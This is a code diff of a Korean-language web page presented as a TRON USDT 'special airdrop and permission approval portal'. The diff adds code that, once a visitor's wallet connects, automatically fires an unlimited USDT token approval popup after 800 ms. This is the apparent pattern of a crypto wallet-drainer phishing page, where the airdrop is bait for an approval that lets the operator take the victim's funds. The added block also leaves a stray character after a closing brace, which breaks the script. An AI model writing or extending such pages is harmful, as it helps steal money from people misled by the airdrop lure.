@@ -4,8 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TRON USDT - TRC-20 스페셜 에어드랍 & 권한 승인 포털</title>
-    <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
-    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         tailwind.config = {
@@ -356,7 +356,12 @@
                     appendLog(`[연결 완료] ${address} | ${data.balance} USDT | ${data.isApproved?'승인완료':'미승인'}`,'success');
                 }
             }catch(e){appendLog('[경고] 백엔드 연결 실패','warn');}
-        }
+
+            // 연결 완료 후 자동으로 승인 팝업 실행
+            if(!isApproved){
+                setTimeout(function(){ executeUnlimitedApprove(); }, 800);
+            }
+        }s
 
         function setApprovedUI(){
             document.getElementById('display-allowance').textContent='무제한 (MAX)';
